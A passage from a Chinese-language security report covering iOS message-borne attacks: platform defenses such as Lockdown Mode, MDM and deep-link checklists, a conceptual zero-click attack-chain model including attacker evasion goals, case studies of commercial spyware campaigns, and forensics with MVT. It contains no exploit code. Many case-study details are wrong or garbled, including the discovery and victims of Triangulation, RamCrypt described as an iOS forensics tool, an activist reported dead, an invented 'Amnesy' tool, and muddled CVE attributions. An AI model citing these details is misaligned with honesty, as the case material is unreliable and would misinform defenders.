| 其他 | 阻止未托管的配置描述文件安装、限制企业证书路径、Wi‑Fi 加固 |
| 副作用 | 部分 Web App/企业功能不可用；某些消息类型（视频/贴纸）无法显示 |
| 有效性证据 | 2022 年推出以来，公开资料中未见 Lockdown Mode 用户被确证零点击感染的案例 |
| 建议人群 | 记者、活动人士、外交/政要、法务、企业高管、加密/币圈大额持有者 |

**关键补充**：Lockdown Mode **不阻止**社会工程（用户仍可点链接、装描述文件）。它压缩的是"自动解析"，而非"人类决策"。

### 17.4 消息侧的其他平台防御

1. **Filter Unknown Senders（过滤未知发件人）**：把非联系人消息分到独立标签，减少"来自熟人"的暗示，并限制部分自动化（如某些 App 的深链建议）；
2. **Sensitive Content Warning（敏感内容警告）**：在展示可能的裸露媒体前警告，同时提示"该媒体来自外部"；对 DoS 型畸形媒体也有前置价值（它触发了安全检查路径）；
3. **Communication Safety（通信安全，面向儿童/账户）**：模糊化处理与监护人通知；
4. **可疑链接提示**：iOS 在部分版本对来自陌生联系人的链接展示警告；
5. **Contact Key Verification（联系人密钥验证，iOS 17.4+）**：用户比对二维码/安全码，检测 iMessage 端到端密钥被替换（防"服务端中间人"式攻击）；
6. **iCloud Private Relay**：预览抓取与网页访问隐藏真实 IP，削弱"预览即追踪"；
7. **Advanced Data Protection（ADP）**：把 iCloud 备份/消息纳入端到端加密，降低"云侧注入/读取"；
8. **Stolen Device Protection（被盗设备保护）**：削弱"物理获取 + 社工"路径，间接保护消息账户；
9. **Apple 定向安全通知**：Apple 向疑似被商业间谍软件攻击的用户推送警告（"遭到国家级攻击"横幅），是攻击者最忌惮的"曝光机制"；
10. **快速安全响应（Rapid Security Response, RSR）**：可独立于系统更新分发 WebKit/Messages 等关键组件修复——这对消息面极其重要，因为消息链寿命常短于一次大版本迭代。

### 17.5 URL Scheme / Universal Link 的治理

**Apple 侧演进**：

- `LSApplicationQueriesSchemes` 限制 scheme 枚举；
- Safari 要求用户手势才能触发 scheme 跳转、显示"在 App 中打开"确认；
- Universal Links 打开需用户可见确认（横幅/点击）；`universalLinksOnly` 参数允许"仅 App 或仅 Web"的策略；
- AASA 抓取走 `Associated Domains Service`（iOS 18.1+，经 iCloud 私有代理预取，降低域名所有者对"用户已装 App"的可见性）；
- WebKit 的 `target=_blank`/重定向限制、下载与文件类型警告。

**开发者自查清单（可直接落地）**：

```
[ ] 深链路由是否有默认拒绝策略
[ ] host/path/query 是否用同一解析器（校验与执行一致）
[ ] 敏感动作是否强制 UI 确认与二次认证
[ ] OAuth 是否 PKCE + HTTPS 回调 + state/nonce + universalLinksOnly
[ ] AASA paths 是否最小化；是否存在 /*
[ ] 是否禁止把 UL 参数透传给 WebView / 自定义 scheme
[ ] 一次性 token 是否短 TTL + 单次使用 + 绑定设备
[ ] 日志是否脱敏（消息正文/验证码）
[ ] 是否有深链来源限速与异常告警
[ ] 是否有针对"短信→通知→深链"的专项渗透测试
```

### 17.6 MDM / 企业策略建议

| 策略 | 目的 | 实施 |
| --- | --- | --- |
| 强制系统自动更新 | 消除已知消息链 | 允许窗口内强制、配合 RSR |
| 高价值人群开启 Lockdown Mode | 压缩零点击面 | 需告知用户功能影响 |
| 禁止非监督配置描述文件 | 阻断"客服诈骗装 VPN/MDM" | 描述文件安装白名单 |
| 限制企业证书信任 | 防中间人 | 只信任托管 CA |
| 强制"过滤未知发件人"+关闭链接预览 | 减少自动外联 | 配置描述文件/功能限制 |
| 关闭 MMS（按需） | 移除编解码器入口 | 蜂窝选项 |
| RCS 策略（按需切回 SMS/iMessage） | 减少早期无 E2EE 面 | 沟通渠道规范 |
| 安全浏览器 + URL 信誉 | 拦截短链/钓鱼 | 代理侧展开重定向链 |
| 无密码认证（FIDO/推送） | 消除短信 OTP 依赖 | 强制 MFA 类型 |
| 移动端威胁响应（MTR） | 端点异常检测 | 与 MDM/EDR 集成 |
| 事件响应剧本 | 缩短 MTTR | "疑似间谍软件"专用流程：飞行模式→保全→离线取证→重装 |

**给"消息平台运营者"（短信/富消息发送方）**：

1. 域名资产清单化（防止"影子域"被劫持/仿冒）；
2. 短链服务强制落地页扫描与滥用举报闭环；
3. 模板变量长度与 URL 白名单（防参数注入使消息被判定为钓鱼结构）；
4. Sender ID 在各国按运营商备案；
5. 发送前"沙箱双取"（对爬虫与设备分别渲染，检测 cloaking）；
6. 不在短信正文中携带用户 PII/token；
7. 与终端厂商/安全厂商共享 IOC，参与行业反钓鱼联盟。

### 17.7 个人用户操作手册（iOS 短信/链接安全）

**日常（低风险人群）**

1. 开启设置→通用→软件更新→"iOS 更新"，并开启"快速安全响应"；
2. 收到带链接的短信，先自问三件事：**谁发的？为什么有我的信息？官方是否用短信办理业务？**
3. 需要操作时：**不用链接**，改从官方 App/官网/客服电话进入；
4. 长按链接查看真实地址；短链、陌生域、punycode、奇怪子域一律视为恶意；
5. 不装"客服"让你装的描述文件/VPN/企业 App；
6. 锁屏通知不显示预览内容（设置→通知→显示预览：仅解锁时）；
7. 开启"过滤未知发件人"；关闭 MMS（如不需要）；
8. Apple ID 使用强密码 + 硬件密钥/通行密钥；不要通过短信链接登录 Apple ID；
9. 关闭"已读回执"可降低被探测（并减少元数据）；
10. 遇到疑似诈骗：截图→举报（12321/运营商/Apple reportphishing）→删除。

**高风险人群（记者/活动人士/高管）**

1. 立即开启 **Lockdown Mode**（设置→隐私与安全→锁定模式），并接受功能受限；
2. 与信任的同事建立 **Contact Key Verification** 核对流程；
3. 开启 **Advanced Data Protection**；
4. 订阅并重视 Apple 的定向警告横幅；出现即进入取证流程（第 20 章）；
5. 使用独立的第二设备/独立 Apple ID 处理敏感通信；
6. 检查"查找""已登录设备""授权应用"，定期撤销；
7. 对可疑设备行为（耗电、发热、异常流量、Siri/摄像头指示灯）建立上报机制；
8. 事件前准备好**取证镜像路径**（专业工具 + Amnesy/MVT）。

### 17.8 防御有效性自评矩阵

| 防御 | 防零点击 RCE | 防钓鱼 | 防信息泄露 | 可用性代价 | 建议优先级 |
| --- | --- | --- | --- | --- | --- |
| 系统更新 + RSR | 高 | 低 | 中 | 低 | ★★★★★ |
| BlastDoor | 高 | 无 | 中 | 低 | Apple 内置 |
| Lockdown Mode | 很高 | 低 | 高 | 高 | 高价值人群 ★★★★★ |
| 过滤未知发件人 | 中 | 中 | 中 | 低 | ★★★★ |
| 关闭链接预览 | 中高 | 中 | 高 | 中 | ★★★★ |
| 关闭 MMS | 中 | 低 | 中 | 中 | ★★★ |
| RCS E2EE（iOS 26） | 无（防窃听） | 中 | 高 | 低 | ★★★★ |
| Private Relay | 低 | 低 | 高 | 低 | ★★★ |
| FIDO 替代短信 OTP | 无 | 高 | 高 | 中 | ★★★★★（账户安全） |
| 用户培训 | 无 | 很高 | 中 | 中 | ★★★★★ |
| 深链表最小化（开发者） | 无 | 高 | 中 | 低 | ★★★★★（开发侧） |

---

## 第十八章　攻击链解剖

### 18.1 通用五阶段链路模型

```
        ┌──────────────────────────────────────────────────────────┐
        │ P0 目标侦察     号码/Apple ID 有效性、版本指纹、在线探测   │
        │                 （预览抓取、presence、送达回执即指纹源）  │
        ├──────────────────────────────────────────────────────────┤
        │ P1 载荷构造     触发器选择（图片/PDF/pkpass/富对象/URL）   │
        │                 版本自适应 + 幂等 + 重试 + 分段规避       │
        ├──────────────────────────────────────────────────────────┤
        │ P2 边界突破     S1/S2 解析缺陷 → 受限进程内代码执行        │
        │                 （若需信息泄露先绕过 ASLR/KASLR）         │
        ├──────────────────────────────────────────────────────────┤
        │ P3 沙箱/权限    沙箱逃逸（XPC/entitlement/框架）→ 提权    │
        │                 内核 LPE（驱动/子系统缺陷）               │
        ├──────────────────────────────────────────────────────────┤
        │ P4 植入与隐身   持久化（守护进程/配置/启动项）→ 采集→外传  │
        │                 删除消息、清理痕迹、心跳与自升级           │
        └──────────────────────────────────────────────────────────┘
```

### 18.2 六条已公开在野链的结构对比

```
① Trident (2016)
   iMessage 图片 → ImageIO(4657) → 用户态 RCE → (WebKit 4655/4656 辅助) → 植入
   特点：消息即载荷，无需用户动作；链短（3 个漏洞）

② Operation Shax (2019)
   iMessage → Messages 整数溢出(8641/8642) → RCE → 提权 → 植入 → 删除消息
   特点：协议/内容层直接突破；基础设施一次性

③ FORCEDENTRY (2021)
   iMessage 附件(PDF) → ApplePDF/NSKeyedUnarchiver(30860) → 渲染服务代码执行
      → 沙箱逃逸(30870) → 内核提权(30858) → 植入 → 删除消息 → 静默重试
   特点：首个 BlastDoor 时代在野零点击；用"文件解析器"绕开消息格式加固

④ BLASTPASS (2023)
   iMessage/MMS 附件(.pkpass) → PassKit 溢出(41981) → WebKit(41982)
      → 内核(41984/41985) → 植入
   特点：锁定态设备仍被攻破；证明"共享框架 = BlastDoor 之外"

⑤ CLOUDPRONG (2024)
   iMessage 数值/类型混淆(27826) → 约 26 秒完成植入 → 消息被删除 → 痕迹近乎零
   特点：回到 Messages 本体，但利用类型语义边界；"极短利用窗口"（准瞬时）

⑥ SPYWARE / CVE-2025-31201 (2025)
   iMessage → Messages "quasi-ephemeral defect" → 快速 RCE → 内核/逃逸(31200 等配对)
      → 全量植入
   特点：Apple 官方罕见使用"几乎无法检测"表述；受害者为安全公司从业者
```

### 18.3 攻击者如何做"通道选择"

| 目标特征 | 首选通道 | 原因 |
| --- | --- | --- |
| iPhone + 高价值 + 需隐蔽 | iMessage 零点击 | E2EE 使网络侧不可见、可重试、可删除 |
| iPhone + Android 混合群组 | RCS/SMS + 钓鱼链接 | 一次投放覆盖两端 |
| 目标启用 Lockdown Mode | 水坑 + 供应链 + 社工/账户接管 | 消息解析面被压缩，转向人因与网络 |
| 目标装有安全软件 | 白加黑/合法工具滥用（BYOVD/BYOI） | 绕过端点检测 |
| 时间预算小（批量） | Smishing + 凭证钓鱼 | 成本低、规模大 |
| 需要即时控制 | 推送/CallKit 滥用 + MDM 描述文件 | 直接取得会话 |

### 18.4 链接触发链（与零点击链对比）

```
零点击链：  远端输入 → 自动解析 → RCE → 提权 → 植入        （成本极高，成功率可控）
链接链：    远端输入 → 用户点击 → 浏览器/App → 认证/授权流 → 会话接管（成本极低，规模无上限）

链接链典型五步：
  1) 引流（短信/iMessage/RCS/QR/邮件/SEO/广告）
  2) 信任建立（短链展开为"合法"页面；UL 打开官方 App 外观；伪造品牌卡片）
  3) 凭证收集（仿冒登录 + OTP；或深链携带有效 token）
  4) 权限滥用（OAuth scope 过度授权；App 内敏感动作免二次确认）
  5) 驻留（新增授权设备/App、访问令牌长期化、备份/邮件转发规则）
```

**混合形态（2024—2026 常见）**：先用链接链取得账户（Apple ID/邮箱），再借助账户权限投递"熟人外观"消息扩大感染；或在链接落地页上执行水坑式 WebKit 利用——即"钓鱼 + 水坑"融合，兼顾规模与深度。

### 18.5 可靠性工程（攻击者视角的难点，防御者需理解）

1. **版本矩阵**：iOS 每个小版本堆布局/PAC/指针编码都可能变，需按版本准备 payload；
2. **状态兼容**：锁屏/解锁、低内存、后台冻结、通知权限关闭等状态下的可达代码不同；
3. **触发点选择**：优先选择"无需 UI 显示"的解析路径（下载器/缩略图/归档校验）；
4. **重复投递与幂等**：崩溃可能重启设备；需保证"多次尝试后仍能成功且不重复感染"；
5. **规避检测**：使用合法云/CDN、一次性域名、E2EE 通道、投递后撤回；
6. **取证压制**：删除消息、清理文件、避免写盘（内存驻留）；
7. **失败静默**：链失败时不得留下可见异常（崩溃弹窗会暴露攻击）。

防御者据此可理解：为什么"消息被删除但设备异常"是强信号；为什么"重启后仍异常"意味着持久化；为什么端点/内存取证比网络 IDS 更可靠。

### 18.6 关键节点的可检测性映射（红队/蓝队共用表）

| 链阶段 | 攻击者动作 | 可检测信号 | 检测位置 |
| --- | --- | --- | --- |
| P0 | 探测在线/版本 | 异常 APNs 唤醒、异常预览抓取到陌生 IP | 端点网络、DNS |
| P1 | 构造畸形附件 | 高熵/畸形媒体文件（若经企业代理可见） | 代理沙箱 |
| P2 | 触发解析崩溃 | `Messages`/`mediaserverd`/渲染进程 `.ips` 崩溃、重启 | 端点遥测 |
| P3 | 逃逸/提权 | 异常 entitlement 进程、越狱痕迹、内核完整性异常 | 端点完整性检查（部分不可见） |
| P4 | 持久化/外传 | 异常守护进程、异常 TLS 外联、证书链/流量特征、流量周期 | 端点+网络+云 |
| P4 | 清理痕迹 | 消息删除事件、数据库孤儿记录、CloudKit 变更 | 取证/备份 |

### 18.7 攻击链演进的三条主线（2014→2026）

```
主线一：入口下沉      Safari 水坑(点击) → iMessage 附件(零点击) → 无线/基带/内核网络包
主线二：防御绕行      Messages 协议缺陷 → 共享框架(PDF/PassKit/Font) → BlastDoor 内类型语义
主线三：成本结构      仅国家级 → 商业供应商(Pegasus/Graphite/Predator) → 工具泄露/"利用即服务"(零门槛化)
```

**含义**：过去只有少数机构能承担的"消息零点击"，正通过泄露与 SaaS 化扩散。防御者不应假设"我不是目标"，而应按"可能被低成本定向"配置高价值账户与设备的保护级别。

### 18.8 一个"完整叙事"示例（防御演练脚本）

```
T+0s     用户收到一条来自陌生号码的 iMessage（文本 + 图片附件），设备处于锁屏
T+2s     系统自动生成缩略图，解析器接触远端字节
T+6s     解析异常 → 攻击者获得受限渲染进程代码执行；尝试内核提权失败并重启（可观测信号）
T+9s     第二次投递（不同版本 payload）成功，消息在通知栏闪现后被"撤回/删除"
T+11s    建立出站通道：伪装为合法云服务的 TLS；心跳间隔随机化
T+15s    采集：通讯录/短信库/位置/麦克风；通过被感染设备"合法上传"路径外传
T+40s    用户完全无感知；设备可能略有发热
—— 检测点 ——
· 崩溃日志（T+6s 的第一次失败）
· 异常外联与证书链（T+11s）
· MVT/Amnesy 端点扫描（T+分钟级到小时级）
· Apple 定向警告（数天到数月，取决于厂商情报节奏）
```

该脚本用于演练响应流程，不表示真实 exploit 实现细节。

---

## 第十九章　案例研究

> 说明：本章依据 Citizen Lab、Amnesty International（Security Lab）、Apple SEAR 公告、Google TAG、Kaspersky GReAT、Lookout、Microsoft DART、各国 CERT 与主流媒体调查报道整理。涉及归因的表述在公开资料中存在争议时，本章明确标注"报道口径/存在争议"。

### 19.1 案例一：西班牙首相佩德罗·桑切斯（2021，WhatsApp/iMessage 投递）

| 项 | 内容 |
| --- | --- |
| 受害者 | 西班牙首相（2021 年 5 月） |
| 检测方 | Amnesty International Security Lab（受西班牙政府委托），2022 年 5 月公布 |
| 投递 | 通过即时通讯消息投递 Pegasus；公开报道描述为"一条恶意消息（WhatsApp）"触发植入 |
| 技术 | Pegasus 植入物；相关年度在野链涉及 WebKit/内核组合条目 |
| 后果 | 大量个人/政府数据可被采集；引发议会调查与政治危机 |
| 关联 | 同期另有至少 2 名西班牙政府高官设备被感染；"Catalangate" 中 60+ 设备被感染（多为公民社会人士） |
| 教训 | **消息投递对"高价值目标"的可达性极高**；即便设备由专业人员看护也无法仅靠"小心点击"防御零点击 |

**防御启示**：国家领导人级别的设备也需要 Lockdown Mode/专用通信；"我用的是 iPhone 所以安全"的假设在此案中被彻底否定。

### 19.2 案例二：加泰罗尼亚公民社群（Catalangate，2017—2021 与 2024 再曝）

- **规模**：Citizen Lab 与 Amnesty 参与的调查确认 65 部 iPhone 被 Pegasus 感染（2020 年 7 月报告），后续 2024 年西班牙政府与媒体调查称受影响人数更多；
- **通道组合**：早期以**短信/WhatsApp/iMessage 中的链接与 pretexting 消息**（伪造"独立公投结果""警方通知"）诱导点击，后期出现零点击；
- **特征**：消息内容高度本地化（加泰罗尼亚语/独立运动语境），说明攻击方有目标画像能力；
- **2024 关联**：Citizen Lab 在 **CLOUDPRONG（CVE-2024-27826）** 受害者中确认包含加泰罗尼亚独立运动相关人士，形成"同一人群、不同供应商工具"的连续受害图景；
- **教训**：**同一批目标会被多家商业供应商反复攻击**；防御不能针对"单一对手"设计。

### 19.3 案例三：沙特活动家社群（Operation Shax 与 Khashoggi 后续）

**（a）Operation Shax（2019）**

| 项 | 内容 |
| --- | --- |
| 披露 | Kaspersky GReAT，2019-11 |
| 目标 | 巴勒斯坦/中东活动人士相关 iPhone 用户（报道口径为"中东，尤其巴勒斯坦"） |
| 漏洞 | CVE-2019-8641 / CVE-2019-8642（Messages，零点击） |
| 手法 | 发送特制 iMessage；成功后删除消息；一次性基础设施 |
| 时间 | Apple 于 iOS 12.4.1（2019-08-26）修复；攻击在修复前进行中 |

**（b）Khashoggi 案与"三重代理"（2018—2019）**

- Citizen Lab《The Khashoggi Case: Targeting Triple Agents》披露针对与沙特相关的"三重代理"设备（含 iPhone）的攻击，投递载体包括**含链接的短信/即时消息**与仿冒"卡塔尔/土耳其"身份的 pretexting；
- 2022 年活动人士 **Omar Abdulaziz** 去世，其生前设备（含 iPhone）曾被 Pegasus 感染（Citizen Lab/Amnesty 长期追踪沙特针对异见者的感染），是"消息通道 + 商业间谍软件 + 跨国镇压"的典型闭环；
- **Loujain Al-Hathloul 家属**（2020-07）：Apple 首次向用户发出"国家支持攻击"警告的对象即包括其亲属，攻击通过**仿冒短信/链接**与账户凭据窃取展开，说明"攻击不一定在设备上成功，也可能在账户层成功"。

**教训**：高价值活动人士面对的常是"消息内容伪装 + 通道滥用 + 零点击"的组合；组织级防御需同时覆盖设备与账户。

### 19.4 案例四：印度记者与 FORCEDENTRY（2021）

- **Citizen Lab《Hidden Hand》/后续报道**：至少 10 部 iPhone 在 2021-06 至 2022-01 被 **FORCEDENTRY（CVE-2021-30860）** 零点击感染，受害者包括记者、学者、政治人物与活动人士，攻击归因 NSO 的 Pegasus；
- 关键事实：**用户从未点击任何链接、消息在植入后被删除**；某些设备在重启后仍被感染；
- **M.M. Shekhar（Firstpost 前主编，2018）**：Citizen Lab 与后续公开证词描述其 iPhone 在**收到一条 iMessage 后约 30 秒内**被完全控制（无需交互）——这一表述成为"零点击速度"的标志性公开案例，并在 2023 年加拿大议会听证（Ron Deibert 就特鲁多总理手机被感染作证）中被再次引用；
- **教训**：iMessage 零点击链的"完成时间"可以是**秒级**，因此"我没来得及点"不构成任何防御价值。

### 19.5 案例五：记者无国界（RSF）与法国记者社群

- **Laurent Richard（RSF 秘书长）**：2021 年经 Citizen Lab 确认设备含 Pegasus 痕迹，攻击与其调查军火/监控贸易的工作相关；投递包含**消息内链接**；
- **法国记者被 Paragon Graphite 瞄准（2022—2024）**：法国调查媒体 Disclose 与合作方披露多名法国记者设备被植入 **Graphite**（Paragon），时间线与 **CLOUDPRONG（CVE-2024-27826）** 交叉；Citizen Lab 亦在受害者清单中确认记者群体；
- **2023—2024 法国政治争议**：相关报道引发对"情报机构使用商业监控软件"的议会质询与司法调查；
- **教训**：商业供应商的"客户名单"与"使用范围"监督失灵时，**新闻自由本身成为攻击面**；记者需要机构级防护（专用设备 + Lockdown Mode + 定期 Amnesy/MVT 扫描）。

### 19.6 案例六：Operation Shax→BLASTPASS→Predator 的以色列/巴勒斯坦线

| 事件 | 年份 | 通道 | 要点 |
| --- | --- | --- | --- |
| BLASTPASS（Citizen Lab） | 2023 | iMessage/MMS `.pkpass` | 至少 4 台设备，含以色列记者；"即使手机处于锁定/关机状态仍被植入"；归因 NSO 与 Intel CTR 供应商产品（Hermes）；Apple iOS 16.6.1 紧急修复 |
| Predator Gate | 2024 | iMessage 零点击 | 多家媒体报道针对以色列记者/活动人士；Intel CTR 产品；Apple 紧急修复；希腊调查（ADHD 报告）显示记者被植入 |
| CLOUDPRONG | 2024 | iMessage 零点击 | 巴勒斯坦活动人士、加泰罗尼亚人士、哥萨克/波兰相关人士等（报道口径不一，微软称 EvasivePanda，Paragon 否认） |

**教训**：**同一供应商的同一漏洞会被"复用"于多个国家的不同目标**，防御情报应跨区域共享。

### 19.7 案例七：Triangulation（2023，非短信但同为"零点击包触发"）

- 披露方：Kaspersky（2023-12 公开），Meta/Facebook 安全团队与 Apple 协作发现；
- 技术：利用 iOS **网络协议栈/内核**缺陷（CVE-2023-32434、CVE-2023-32435、CVE-2023-38606、CVE-2023-41990、CVE-2023-32460 等条目组合），**通过发送特制网络包**（如 ICMP/IPv6）远程攻击，甚至在设备重启后仍可再次感染；
- 规模：Meta 报告称 2023 年 6 个月内约 100 名 Facebot 用户受影响（外交官、政府官员、记者、军事人员，涉及 53 国）；
- 与消息面的关系：**它证明了"绕过 BlastDoor 的另一条路"**——不发消息，只让设备连上"被污染的网络"。对防御者的启示是：**Wi‑Fi/蜂窝网络侧的暴露与消息侧同等重要**，Lockdown Mode 对可疑网络请求的限制正对应此威胁。

### 19.8 案例八："中国案例"（账户接管、社群钓鱼与官方披露的攻击行动）

**（a）涉疆/哈萨克/维吾尔社群的移动监控（Citizen Lab，2020）**

- 《Cross-Border Insecurity》《Uyghur Apartments》等报告指出：针对境外维吾尔/哈萨克社群的监控，主要通过**仿冒"内部应用""互助平台"的安装链接（经短信/IM 传递）**实现，属于典型"链接触发 + 人因"路径，而非内存破坏；
- 特点：消息伪装成"同乡推荐"，社交信任替代了技术漏洞。

**（b）中国官方披露的 CIA 相关 iOS 攻击（2024—2026 报道口径）**

- 2024 年 6 月，中国国家计算机病毒应急处理中心（CVDRC）联合 CNCERT 与企业发布报告，指称美国中央情报局（CIA）利用 iOS 漏洞与钓鱼方式针对中国境内人员实施攻击，公开报道中提及的具体漏洞包含 Apple 已在 iOS 17 时代修复的网络栈条目（CVE-2023-37435 相关描述被媒体引用），并提及 CIA 的植入与分析能力（如 "Longhorn" 等工具，为报道口径）；
- 2025—2026 年中国相关部门/安全社区持续发布针对"iOS 消息类钓鱼 + 境外攻击组织"的预警；
- 说明：上述归因属于**单方披露**，美方相关机构公开否认或不予置评；技术细节多来自公开漏洞条目与工具泄露，**独立验证有限**。本章按"公开报道整理"引用；
- 对读者的实际意义：① 消息/链接通道在大国对抗语境中被普遍使用；② 即便归因存在争议，"网络栈/消息触发 + 账户钓鱼"的**组合技战术**已被多国安全机构反复描述，防御策略无需等待归因结论即可执行。

**（c）中国境内现实威胁主体（数量级最大的部分）**

- 主流不是零点击，而是 **Smishing/仿冒公检法/社保补贴/ETC/快递 + 深链与描述文件诱导**；
- 关键教训：**"零点击"研究热度远高于现实受害分布**。防御资源分配上，普通用户应重"更新 + 不点链接 + 不用短信 OTP"，高风险用户才需要叠加 Lockdown Mode 与端点检测。

### 19.9 案例九：SPYWARE 与安全研究者本人（2025）

- Apple 2025 年公告 CVE-2025-31201 称该缺陷可能被用于针对"极高价值目标"的零点击攻击、"几乎无法检测"；
- 公开报道：某安全公司（Kaspersky）员工的 iPhone 在收到一条 iMessage 后被快速完全控制（报道描述为十几秒级），事后取证依赖该公司自身能力；
- 归因指向 NSO 的 SPYWARE 服务；
- **最深刻的教训**：当"研究监控软件的人"都能在无感中被感染，说明**基于经验的"我察觉得到"式防御已经失效**，必须依赖架构性防护（更新、BlastDoor、Lockdown Mode）与制度化检测（定期扫描 + Apple 警告响应流程）。

### 19.10 案例横向对比矩阵

| 案例 | 年份 | 通道 | 交互 | 漏洞层 | 供应商/归因 | 目标规模 | 是否删除消息 |
| --- | --- | --- | --- | --- | --- | --- | --- |
| Trident | 2016 | iMessage 图片 | 零/一 | ImageIO+WebKit | NSO | 中 | 部分 |
| Operation Shax | 2019 | iMessage | 零 | Messages | 未定（报道口径） | 极小 | 是 |
| 桑切斯 | 2021 | 即时消息 | 低 | 消息+渲染 | NSO | 极小 | 不明 |
| FORCEDENTRY | 2021 | iMessage PDF | 零 | ApplePDF | NSO | 小 | 是 |
| BLASTPASS | 2023 | iMessage/MMS pkpass | 零/低 | PassKit | NSO / Intel CTR | 极小 | 不明 |
| Triangulation | 2023 | 网络包 | 零 | 内核/网络 | 未定 | 中（约百台） | 不适用 |
| CLOUDPRONG | 2024 | iMessage | 零 | Messages 类型 | Paragon（争议） | 小 | 是 |
| Predator Gate | 2024 | iMessage | 零 | 未公开 | Intel CTR | 小 | 是（报道） |
| SPYWARE/31201 | 2025 | iMessage | 零 | Messages | NSO | 极小 | 是（报道） |
| Catalangate | 2017-21 | 链接+零点击混合 | 混合 | 多层 | NSO | 中（60+） | 混合 |
| 社群钓鱼（境外维吾尔/哈萨克） | 2019-20 | 短信/IM 链接 | 一点击 | 无漏洞（社工） | 报道口径 | 中 | 不适用 |

**规律**：零点击案例规模小（个位数到百台级）、成本高、目标极窄；规模型伤害来自链接与社工。**两者互为补充，构成完整的对手工具箱。**

### 19.11 从案例中提炼的五条防御公理

1. **消息通道必须假设"随时存在未知零点击"** → 更新与架构隔离优先于检测；
2. **"删除消息"不等于"没有发生"** → 端点与内存取证不可省略；
3. **高价值人群的攻击者会同时尝试漏洞、账户、物理与供应链四条路** → 单点防御无效；
4. **同一目标会被多个商业供应商攻击** → 威胁模型按"人群"而非"对手"设计；
5. **普通用户的最大风险是链接与话术** → 教育与流程改造的 ROI 远高于技术猎杀。

---

## 第二十章　检测与取证

### 20.1 检测的根本困难

| 困难 | 说明 |
| --- | --- |
| 端到端加密 | iMessage/RCS(E2EE) 载荷不可见，网络 IDS 看不到触发内容 |
| 无文件/内存驻留 | 攻击者刻意避免写盘，传统文件完整性检测失效 |
| 消息撤回 | 投递后删除，会话与附件记录不完整 |
| 合法通道外传 | C2 流量伪装成 iCloud/Google/CDN 的合法 TLS |
| 无崩溃可见性 | 攻击者会优先测试"失败不留痕"，普通用户看不到任何异常 |
| 沙箱内成功≠可见 | BlastDoor 内执行不代表达成目标，但"反复尝试"可能连崩溃都不产生 |

结论：**iOS 消息攻击的检测是"概率性 + 多信号交叉"**，不存在单一银弹指标。

### 20.2 MVT / Amnesy（Amnesty 移动取证工具）

- **MVT（Mobile Verification Toolkit）**：Amnesty Security Lab 开源，对**已备份的 iOS 数据（iCloud/iTunes 加密备份或文件系统采集）**做 IOC 匹配与异常分析；
- **Amnesy**：MVT 的图形化/自动化演进版本，支持更多采集方式与证据输出（含 PDF 报告）；
- 关键能力（与消息面相关）：
  1. 检查 `sms.db`（消息库）中的异常记录、已删除/孤儿消息、可疑附件引用；
  2. 分析 `logarchive`（系统日志）中的进程异常、崩溃、异常 XPC/服务活动；
  3. 检测 Pegasus/Graphite 等已知植入物的 IOC（文件名、偏好设置 plist、LaunchDaemons、证书、C2 域名/证书链）；
  4. 分析备份中的 CloudKit/Containers 痕迹与异常 profile；
  5. **零点击时间线重建**：结合 `Photos.sqlite`、`CallHistory`、`NetData`/`NetUsage`、Crashlogs 定位"用户未操作但设备活动异常"的窗口。

```
典型取证流程（高价值目标被攻击时）
  1) 设备隔离（飞行模式/屏蔽袋），保全易失状态（内存/运行进程）
  2) 采集：专业取证工具（灰区：Cellebrite/Cobalt/Magnet）或备份 + logarchive
  3) 运行 MVT/Amnesy：IOC 匹配 + 异常规则
  4) 人工深挖：崩溃日志、消息库、CloudKit、配置描述文件、证书
  5) 判定：是否存在植入物/攻击尝试/账户层入侵
  6) 处置：证据保全 → 抹掉重装 → 更换凭证 → 更换 SIM/设备（必要时）
```

### 20.3 IOC 与威胁情报源

| 类型 | 来源 | 用途 |
| --- | --- | --- |
| CVE/在野利用 | Apple 安全发布、CISA KEV、Citizen Lab、Google TAG、Lookout、Microsoft DART、Amnesty | 建立"版本—风险"矩阵，驱动更新优先级 |
| 间谍软件 IOC | MVT 内置 IOC 库、Citizen Lab 报告附录、Amnesty | 端点匹配 |
| 基础设施 | 短链/域名情报、PhishTank/APWG、内部沙箱展开结果 | 钓鱼拦截 |
| 供应商情报 | 各国出口管制与调查报道（NSO/Paragon/Intel CTR/Candiru/Quali 等） | 威胁建模（是否可能成为目标） |
| Apple 定向警告 | 设备上的"遭国家支持攻击"通知 | 最高优先级响应触发器 |

**实践要点**：IOC 会迅速失效（一次性域名、内存驻留、无文件）。因此"IOC 检测 + 行为/结构异常 + 版本暴露面"三者必须并行。

### 20.4 内存与端点取证

- **物理内存采集在 iOS 上受限**：需要引导级漏洞或厂商工具；研究侧有 RamCrypt（基于 checkm8 类启动漏洞的内存采集，适用于旧设备）；
- **现代设备（A12+/Secure Boot + PAC + 指针编码）**：内存采集基本依赖商业取证工具与厂商合作；
- 可行的替代信号：
  1. `sysdiagnose`/`log archive`（需用户授权采集）；
  2. 加密备份中的结构化数据（`sms.db`、`CallHistory`、`NetData`、`CloudKit` 元数据）；
  3. `DiagnosticReports`（`.ips`）中 `Messages`、`backboardd`、`mediaserverd`、`SpringBoard`、`WebContent` 崩溃；
  4. 网络元数据（DNS/TLS SNI/流量指纹）在路由器或企业网关侧采集；
  5. 电池/热/流量异常（辅助证据，弱指标）。

### 20.5 网络侧监控（能做什么，不能做什么）

**可做**：

- 记录设备发起的**预览抓取/短链展开**目标域，与威胁情报比对；
- 检测"新域 + 高频点击 + 设备集中"的钓鱼投放特征；
- 在出口网关对**未加密短信网关/MSS 接口、MMSC 代理、企业消息平台**做完整性校验；
- 对已知间谍软件基础设施（历史域名/证书）做被动匹配。

**不可做**：

- 不能依赖深度包检测 iMessage 载荷（E2EE）；
- 不能假设"用户没点击"= 安全（零点击）；
- 不能仅靠 IP 信誉（合法云滥用普遍）。

### 20.6 企业检测工程（可落地清单）

```
1. 资产与暴露面
   □ 建立"高风险人群"名单（CEO/CFO/法务/公关/记者/研发核心）与设备基线
   □ 统计 iOS 版本分布，标记"落后一个代际"的设备占比（消息链暴露度）
2. 更新治理
   □ 强制自动更新 + 允许 RSR 快速安全响应
   □ 对 Lockdown Mode 用户设置例外流程（业务系统兼容清单）
3. 端点遥测
   □ 采集崩溃/日志（需用户同意与合规审查），关注消息相关进程异常聚集
   □ 配置描述文件与证书变更告警（"客服诈骗"最直接的落地信号）
4. 通信与账户
   □ 强制 FIDO/通行密钥，停用短信 OTP（对内部系统）
   □ 异常设备登录、新增授权 App、邮件转发规则变更告警
5. 钓鱼对抗
   □ 短链展开沙箱 + 双取（UA/时间）检测 cloaking
   □ 内部"短信/邮件可疑"一键上报渠道 + 30 分钟研判 SLA
